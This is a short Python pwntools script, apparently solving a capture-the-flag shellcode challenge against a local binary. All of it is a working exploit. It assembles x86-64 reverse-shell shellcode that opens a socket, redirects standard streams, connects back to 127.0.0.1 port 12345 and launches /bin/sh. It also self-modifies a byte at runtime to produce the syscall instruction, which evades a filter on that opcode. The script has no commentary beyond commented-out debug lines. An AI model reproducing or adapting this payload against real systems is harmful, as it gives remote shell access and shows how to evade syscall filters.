#!/usr/bin/python3

from pwn import *

# p = gdb.debug("./shellcode",'''
#               b * main+228
#               c
#               ''')
p = process("./shellcode")
#p = remote("127.0.0.1",1337)
payload = asm('''
              lea rbx, [rip + sys_call +1]
              inc byte ptr [rbx]
              mov r14,rax
              mov rax,0x29 
              mov rdi,2
              mov rsi,1
              mov rdx,0
              call sys_call
              mov r14,rax 


              mov rsi,2
              mov rdi,r14
            
              dup2:
                mov rax,0x21
                call sys_call
                dec rsi
                jns dup2






              mov rdi,r14
              lea rsi,[rip + sock_addr]
              mov rdx,16
              mov rax,0x2a
              call sys_call

            
              


              movabs rbx,29400045130965551 
              push rbx
              mov rdi,rsp
              mov rax,0x3b
              xor rsi,rsi
              xor rdx,rdx
              call sys_call

              sys_call:
                .byte 0x0f
                .byte 0x04
                ret
              sock_addr:
                .quad 0x100007F39300002
                .quad 0
              
              ''',arch = 'amd64')
p.sendline(payload)

p.interactive()